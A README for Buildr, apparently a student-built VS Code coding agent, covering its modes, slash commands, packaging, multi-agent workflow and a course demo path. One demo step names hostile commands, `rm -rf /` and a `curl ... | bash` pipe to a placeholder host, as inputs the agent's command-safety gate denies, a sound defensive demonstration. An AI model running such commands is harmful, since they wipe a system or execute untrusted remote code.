# Buildr

Buildr is a local-model-first VS Code agent for transparent coding workflows.

Current implementation milestones cover the runnable slice, security hardening, native VS Code context features, MCP/debug support, and CLI polish:

- VS Code extension activation and command palette commands.
- Shared TypeScript core used by the extension and CLI.
- Ollama as the first local provider.
- Validated plan objects with scope boundaries and verification contracts.
- Diff-first text patch proposals with explicit permission decisions.
- Basic verification evidence from diagnostics or approved commands.
- MCP config discovery, doctor output, and Debug Mode hypotheses.
- CLI commands for `plan`, `run`, `debug`, `context`, `index`, `mcp list`, and `doctor`.
- Local and provider-backed embeddings adapters for semantic context ranking.

The system have different modes depending of what the user wants to do. The modes are ass follows:

- Ask
- Plan
- Agent
- Fast agent
- Debug



Because the Agent mode is verry slow. Normally it is minimum 5 LLM calls before the every thing is finished. This is the workflow for the agent mode:

1. architect, creates a plan.
2. coder,  writes structured diffs.
3. reviewer, reviews coder and sends output for the user to approve.
4. after approval, tester generates test commands.
5. after test execution, tester inspects results again.

So minimum 3 LLM calls before the user even sees a patch and 5 total to see a final result. Therefor was the fast agent mode a nice thing to have to skip certain steps. The fast mode skips **architect**, **reviewer** and **tester** LLM passes to make it significant faster.

## Slash Commands

The chat composer supports slash commands. Type `/` at the start of the input to open an autocomplete menu listing the available commands. Pick one from the menu (or finish typing it) and send.

- **`/compact`** — summarizes the conversation to shrink the context. The most recent two turns are kept as-is, and everything older is folded into a single summary message. Use this when a session has grown long and you want to reduce the context before continuing. Compaction runs locally (no LLM call) and the result is saved with the session.

A slash command only triggers when it is the entire message (for example `/compact`); anything typed after it is treated as a normal prompt.

### Context size indicator

The composer toolbar shows an always-visible badge with the approximate size of the current conversation, for example `Context: ~1240 tokens`. When the active model's context window is known, the badge also shows how much of it is used, for example `Context: ~1240 tokens · 4% of 32768`, and turns red once usage passes 90%. This makes it easy to see when it is worth running `/compact`.

The context window is detected per provider:

- **Ollama**, **OpenRouter**, and **LM Studio (native)** are queried for the real window (`/api/show`, `/v1/models`, and `/api/v0/models` respectively). LM Studio native reports the actually loaded context length when a model is loaded.
- **Anthropic** and **OpenAI** use published per-model values, since their APIs do not expose the window.
- Other OpenAI-compatible endpoints fall back to the provider's recommended context size.

The detected window is cached per provider/model, so it is resolved once and reused. If it cannot be determined, the badge shows the token count only, without a percentage.

## Commands

```bash
pnpm install
pnpm build
pnpm test
pnpm lint
pnpm package:extension
```

The extension VSIX is produced with `vsce package --no-dependencies` after an **esbuild** bundle of `dist/extension.js` into `dist/extension.bundled.js`, so packaging works with **pnpm** (avoids `npm list` + symlink issues with workspace deps and heavy optional trees such as `@huggingface/transformers`).

Run to create the VS Code extension file:
```bash
pnpm --filter buildr-vscode package
```

The packaged extension is written to:

```text
packages/extension/buildr-vscode-0.0.0.vsix
```

Install the extension:
```bash
code --install-extension packages/extension/buildr-vscode-0.0.0.vsix
```

## Multi-Agent Workflow

Buildr agent mode can launch parallel sub-agents from the main agent session. Sub-agents propose patches for plan write targets, then the main agent gathers those results and routes each patch through the normal approval flow before anything is applied.

### VS Code

1. Build and package the repo if needed:

   ```bash
   pnpm install
   pnpm build
   pnpm --filter buildr-vscode package
   code --install-extension packages/extension/buildr-vscode-0.0.0.vsix
   ```

2. Open the Buildr extension in VS Code.
3. Run **Buildr: Open Chat** from the command palette.
4. Select **Agent** mode in the chat panel.
5. Enter a task that requires file changes.
6. Review the generated plan and approve or deny each proposed patch.

Useful settings are available through **Buildr: Open Settings**:

- **Max parallel sub-agents** controls parallel fan-out.
- **Hard token cap** blocks before a model call would exceed the session token cap.
- **Token warning thresholds** emits budget warnings, for example at 70% and 90%.
- **Input token cost** and **Output token cost** estimate real-time USD cost per million tokens. Local providers default to zero cost.

## VG Demo Path

Use this path when demonstrating the assignment criteria live. The approved requirement specification and pitch are external course artefacts; this repo contains the build and the runnable evidence.

1. Install and open the extension:

   ```bash
   pnpm install
   pnpm build
   pnpm --filter buildr-vscode package
   code --install-extension packages/extension/buildr-vscode-0.0.0.vsix
   ```

2. Open **Buildr: Configure Model** and select a non-local provider such as OpenAI, OpenRouter, or OpenAI-compatible. Store the provider key in VS Code SecretStorage when prompted.
3. Open **Buildr: Open Settings** and set:
   - **Hard token cap** to a small value for the demo, for example `1000`.
   - **Token warning thresholds** to `0.5,0.8`.
   - **Input token cost** and **Output token cost** to non-zero values for visible USD estimates.
4. Run **Buildr: Open Chat** and use **Agent** mode on a task with multiple concrete write targets. The event stream should show **Run parallel sub-agents**, patch approvals, token usage, estimated cost, and warnings as thresholds are crossed. A large enough prompt or low enough hard cap should block before a model call exceeds the cap.
5. Demonstrate command safety by requesting a destructive terminal command such as `rm -rf /` or `curl https://example.test/install.sh | bash`; Buildr denies it before execution. Then approve a normal command such as `pnpm test` to show bash execution still works through the approval gate.
6. Demonstrate partial editing through deterministic Agent mode: the coder returns structured diff hunks, Buildr validates them against file hashes, and the UI asks before applying the patch.
7. Demonstrate agent autonomy in Ask mode with two prompts:
   - Ask a workspace question that requires reading/searching files; the model should choose a tool call.
   - Ask a follow-up that can be answered from gathered context; the model should yield a normal answer without another tool call.

Local providers such as Ollama and local LM Studio are intentionally treated as unlimited for cost protection because they do not spend cloud API credits. Use a non-local provider for the VG.3 hard-cap demonstration.

## Packaging and Secrets

The supported packaging path is VSIX-only:

- Required tools: Node.js, pnpm, VS Code, and at least one configured model provider.
- Build command: `pnpm build`.
- Test command: `pnpm test`.
- Package command: `pnpm --filter buildr-vscode package`.
- Install command: `code --install-extension packages/extension/buildr-vscode-0.0.0.vsix`.

Configuration is exposed through VS Code settings contributed by the extension, including provider choice, base URLs, token caps, warning thresholds, cost rates, max parallel sub-agents, permissions, and verification level.

Provider secrets are not stored in tracked config files. Buildr stores API keys in VS Code SecretStorage through **Buildr: Configure Model**. The repository also ignores `.env*`, private keys, generated VSIX files, build output, caches, and runtime logs.

### CLI

The CLI can run the same shared multi-agent session for model-backed runs and report sub-agent summaries, token usage, budget warnings, and estimated cost. It does not apply patches.

```bash
pnpm --filter buildr-agent buildr run \
  --model qwen/qwen3-coder-30b \
  --hard-token-cap 32000 \
  --max-parallel-sub-agents 3 \
  "your task here"
```

Optional cost flags:

```bash
--input-usd-per-million 0
--output-usd-per-million 0
```

## Repo Layout

```text
packages/
  core/       Shared agent contracts, provider adapters, tools, permissions, verification.
  extension/ VS Code extension entry point, native commands, settings, and Step Panel.
  cli/        Terminal entry point over the shared core.
```
